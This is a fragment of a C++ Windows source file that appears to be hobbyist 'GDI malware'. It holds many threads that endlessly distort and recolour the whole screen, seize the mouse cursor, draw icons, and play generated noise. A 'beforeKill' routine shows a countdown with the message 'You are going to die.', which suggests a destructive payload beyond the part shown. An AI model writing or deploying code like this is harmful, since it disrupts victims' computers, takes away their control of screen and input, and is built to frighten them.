		for (int x = 0; x < w; x += 25) {
			int rnd = 5 - (rand() % 11);
			StretchBlt(hcdc, x, -rnd, 25, h + rnd, hcdc, x, rnd, 25, h, SRCCOPY);
		}
		BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
		Sleep(1); i++; angle += 0.01f;
	}
}
DWORD WINAPI shader8(LPVOID lpParam) { //Fuck you camellia aka skidilia
	RGBQUAD rgbquadCopy; HBRUSH hBrush = NULL; int i = 0, rop = 0;
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdc2 = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		DOUBLE angle = 0.f;
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				int fx = (int)((4 * i) + ((4 * i) * (x / 32.0)) + (4 * i) + ((4 * i) * (y / 24.0)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int y = 0; y < h; y += 25) {
			rop = SRCCOPY; int rnd = rand() % 31;
			if (rnd >= 10 && rnd < 20) { rop = SRCCOPY; }
			else if (rnd >= 20 && rnd < 30) { rop = SRCCOPY; }
			int rnd1 = 10 - (rand() % 21);
			StretchBlt(hcdc, -rnd1, y, w + rnd1, 25, hcdc, rnd1, y, w, 25, rop);
		}
		BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
		Sleep(1); i++; angle += 0.01f;
	}
}
DWORD WINAPI poly(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		for (int i = 0; i < 10; i++) {
			POINT pts[3];
			INT x = rand() % w;
			INT y = rand() % h;
			INT size = 60 + rand() % 40;

			pts[0].x = x;
			pts[0].y = y;
			pts[1].x = x + size;
			pts[1].y = y;
			pts[2].x = x + size / 2;
			pts[2].y = y - size;

			HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
			HPEN hOldPen = SelectPen(hdc, hPen);

			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 7, rand() % 2, rand() % 5));
			HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
			Polygon(hdc, pts, 3);

			SelectBrush(hdc, hOldBrush);
			DeleteObject(hBrush);

			SelectPen(hdc, hOldPen);
			DeleteObject(hPen);
			Sleep(10);
		}
	}
	ReleaseDC(NULL, hdc);
	return 0x00;
}
DWORD WINAPI shader9(LPVOID lpParam) {
	int i = 0, xxx = 0, power = 75; double angle = 0.f;
	int cix = 0, ciy = 0, size = 450 + ((1 + rand() % 14) * 100), ccciii = size;
	while (1) {
		HDC hdc = GetDC(0), hdc2 = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		INT w = GetSystemMetrics(SM_CXSCREEN);
		INT h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCAND);
		}
		int x = power * cos(angle * 3.1415926 / 30), y = power * sin(angle * 3.1415926 / 30);
		StretchBlt(hcdc, x / 2, y / 2, w - x, h - y, hcdc, 0, 0, w, h, SRCCOPY);
		BitBlt(hcdc, rand() % 25, rand() % 25, w, h, hcdc, rand() % 25, rand() % 25, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				// Copy the current pixel color
				rgbquadCopy = rgbquad[index];

				// Convert RGB to HSL
				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Set saturation to 0 to make it grayscale
				hslcolor.s = 0.0f;

				// Convert back to RGB
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hdc2); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc); DeleteDC(hdc2);
		if (angle > 361) { angle = 0; }
		else { angle += 3.1415926 / 2; }
		Sleep(1); i++; xxx += 5;
	}
}
DWORD WINAPI shader10(LPVOID lpParam) {
	int i = 0, xxx = 0;
	while (1) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		INT w = GetSystemMetrics(SM_CXSCREEN);
		INT h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor; RGBQUAD rgbquadCopy;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -20 + rand() % 41, y, w, 20, hcdc, 0, y, w, 20, SRCCOPY);
		}
		for (int y = 0; y < h; y += 50) {
			StretchBlt(hcdc, -20 + rand() % 41, y, w, 50, hcdc, 0, y, w, 50, SRCERASE);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x, fx = xxx + cbrt((x * i) * (y * i));

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
		Sleep(10); i++; xxx += 2;
	}
}
DWORD WINAPI shader11(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (225) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx + x) / 10000000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI shader12(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int average = round((float)(rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 10);
			rgbScreen[i].r = average + x;
			rgbScreen[i].r = average + y;
			rgbScreen[i].b = average + x;
			rgbScreen[i].rgb -= x + y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader13(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int average = round((float)(rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 10);
			rgbScreen[i].r += average + cbrt(x & y);
			rgbScreen[i].g += average + cbrt(x ^ y);
			rgbScreen[i].b += average + cbrt(x + y);
			rgbScreen[i].rgb -= 25;
		}
		POINT point[3];
		int increment = 10 + rand() % 40;
		if (rand() % 10 >= 6) {
			point[0].x = increment; point[0].y = -increment;
			point[1].x = w + increment; point[1].y = increment;
			point[2].x = -increment; point[2].y = h - increment;
		}
		else {
			point[0].x = -increment; point[0].y = increment;
			point[1].x = w - increment; point[1].y = -increment;
			point[2].x = increment; point[2].y = h + increment;
		}
		PlgBlt(hdcMem, point, hdcMem, 0, 0, w, h, 0, 0, 0);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI zer1() {
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left + rand() % 110 - 50;
	wPt[0].y = wRect.top + rand() % 210 - 100;
	wPt[1].x = wRect.right + rand() % 210 - 100;
	wPt[1].y = wRect.top + rand() % 410 - 200;
	wPt[2].x = wRect.left + c - rand() % 210 - c;
	wPt[2].y = wRect.bottom - c + rand() % 210 - c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(40);
	if (rand() % 5 == 1) RedrawWindow(0, 0, 0, 133);
	ReleaseDC(0, desk);
}
VOID WINAPI zer2() {
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left - rand() % 110 + 50;
	wPt[0].y = wRect.top - rand() % 210 + 100;
	wPt[1].x = wRect.right - rand() % 210 + 100;
	wPt[1].y = wRect.top - rand() % 410 + 200;
	wPt[2].x = wRect.left - c + rand() % 210 + c;
	wPt[2].y = wRect.bottom + c - rand() % 210 + c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(20);
	if (rand() % 5 == 1) RedrawWindow(0, 0, 0, 133);
	ReleaseDC(0, desk);
}
DWORD WINAPI shader14(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int average = round((float)(rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 10);
			rgbScreen[i].r *= average + cbrt(x & y);
			rgbScreen[i].g -= average + cbrt(x ^ y);
			rgbScreen[i].b += average + cbrt(x + y);
			rgbScreen[i].rgb -= 25;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload14(LPVOID lpParam) {
	while (1) {
		zer1();
		zer2();
		zer2();
		zer1();
	}
}
DWORD WINAPI shader15(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= (x * x ^ i) - (y ^ y | i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader16(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	POINT point[3];
	INT increment = 10 + rand() % 40;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				//CenterX and CenterY
				int cx = abs(x - (screenWidth / 2));
				int cy = abs(y - (screenHeight / 2));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				//XOR Pattern
				int fx = (zx * i) ^ (zy * i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 100000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		if (rand() % 10 >= 6)
		{
			point[0].x = increment; point[0].y = -increment;
			point[1].x = screenWidth + increment; point[1].y = increment;
			point[2].x = -increment; point[2].y = screenHeight + increment;
		}
		else
		{
			point[0].x = -increment; point[0].y = increment;
			point[1].x = screenWidth - increment; point[1].y = -increment;
			point[2].x = increment; point[2].y = screenHeight - increment;
		}
		i++; angle += 0.01f;
		PlgBlt(hdcCopy, point, hdcCopy, 0, 0, screenWidth, screenHeight, 0, 0, 0);
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI shader17(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	INT radius = 8.4f;
	DOUBLE angle = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				rgbquad[index].rgbRed ^= x;
				rgbquad[index].rgbGreen ^= y;
				rgbquad[index].rgbBlue ^= x + y;
			}
		}

		i++;
		float x = cos(angle) * radius;
		float y = sin(angle) * radius;

		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, x, y, SRCCOPY);

		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}

	return 0x00;
}
DWORD WINAPI icon2(LPVOID lpvd)
{
	INT i = 0;
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		INT angleX = (cos(i * 50) * tan(i * 3) * (i + 120)) + (w / 2), angleY = (sin(i * 72) * cos(i * 3) * (i + 120)) + (h / 2);
		DrawIcon(hdc, angleX, angleY, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
		ReleaseDC(0, hdc);
		Sleep(10);
		i++;
	}
	return 0x00;
}
DWORD WINAPI mess(LPVOID lpvd) {
	while (1) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);

		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(hcdc, -6, -6, w + 12, h + 12, hcdc, 0, 0, w, h, SRCAND);

		for (int x = 0; x < w; x += 20) {
			StretchBlt(hcdc, x, -5 + rand() % 10, 20, h, hcdc, x, 0, 20, h, SRCPAINT);
		}
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -5 + rand() % 10, y, w, 20, hcdc, 0, y, w, 20, SRCPAINT);
		}
		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCAND);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI dark(LPVOID lpParam) { //credits to LeoLezury (from Terminator.exe)
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w / 2, h / 1);
	SelectObject(hcdc, hBitmap);
	for (;;) {
		hdc = GetDC(NULL);
		StretchBlt(hcdc, 0, 0, w / 2, h / 1, hdc, 0, 0, w, h, SRCCOPY);
		for (int i = 0; i < w / 2; i++) {
			for (int j = 0; j < h / 1; j++) {
				int r = GetRValue(GetPixel(hcdc, i, j));
				int g = GetGValue(GetPixel(hcdc, i, j));
				int b = GetBValue(GetPixel(hcdc, i, j));
				SetPixel(hcdc, i, j, RGB((r + g + b) / 3, (r + g + b) / 3, (r + g + b) / 3));
			}
		}
		StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w / 2, h / 1, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	return 0;
}
DWORD WINAPI curmove(LPVOID lpvd) {
	POINT cursor;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		//int X = cursor.x + rand() % 3 - 1;
		//int Y = cursor.y + rand() % 3 - 1;
		//int top_x = 0 + cursor.x;
		//int top_y = 0 + cursor.y;
		//int size = rand() % 900 +100;
		//int bottom_x = 300 + cursor.x;
		//int bottom_y = 300 + cursor.y;
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON2)));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return(1);
}
DWORD WINAPI shader19(LPVOID lpvd) {
	int i = 0;
	while (1) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		INT w = GetSystemMetrics(SM_CXSCREEN);
		INT h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor; RGBQUAD rgbquadCopy;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -20 + rand() % 41, y, w, 20, hcdc, 0, y, w, 20, SRCCOPY);
		}
		for (int y = 0; y < h; y += 50) {
			StretchBlt(hcdc, -20 + rand() % 41, y, w, 50, hcdc, 0, y, w, 50, SRCCOPY);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x, fx = 225;

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
		Sleep(10); i++;
	}
}
DWORD WINAPI shaderfinale(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (rand() % 0x100) * 0x010101;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI beforeKill(LPVOID lpParam) { //credits to ChrisRM-380
	int secondspass = 0;
	while (1) {
		HDC hdc = GetDC(0);
		int X = GetSystemMetrics(SM_CXSCREEN);
		int Y = GetSystemMetrics(SM_CYSCREEN);
		LPCWSTR texts[] = { L"10",L"9",L"8",L"7",L"6",L"5",L"4",L"3",L"2",L"1",L"0" };
		for (int i = 0; i < 5; i++) {
			SIZE size;
			LPCWSTR msg = L"You are going to die.";
			TextOutW(hdc, X / 2, 500, texts[secondspass], wcslen(texts[secondspass]));

			LOGFONT lf;
			GetObject(GetStockObject(DEFAULT_GUI_FONT), sizeof(LOGFONT), &lf);
			HFONT font = CreateFont(35, lf.lfWidth,
				lf.lfEscapement, lf.lfOrientation, lf.lfWeight,
				lf.lfItalic, lf.lfUnderline, lf.lfStrikeOut, lf.lfCharSet,
				lf.lfOutPrecision, lf.lfClipPrecision, lf.lfQuality,
				lf.lfPitchAndFamily, lf.lfFaceName);

			SelectObject(hdc, font);
			SetTextColor(hdc, Hue(239));
			SetBkColor(hdc, RGB(0, 0, 0));

			GetTextExtentPoint32(hdc, msg, lstrlenW(msg), &size);
			TextOutW(hdc, size.cy / 2, 30 - size.cy / 2, msg, lstrlenW(msg));
			Sleep(200);
		}
		secondspass++;
		InvalidateRect(0, 0, true);
		if (secondspass > 9) {
			secondspass = 9;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(cos(t ^ t >> 8) * tan(t >> 8 & t) + sin(t >> 9 * t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
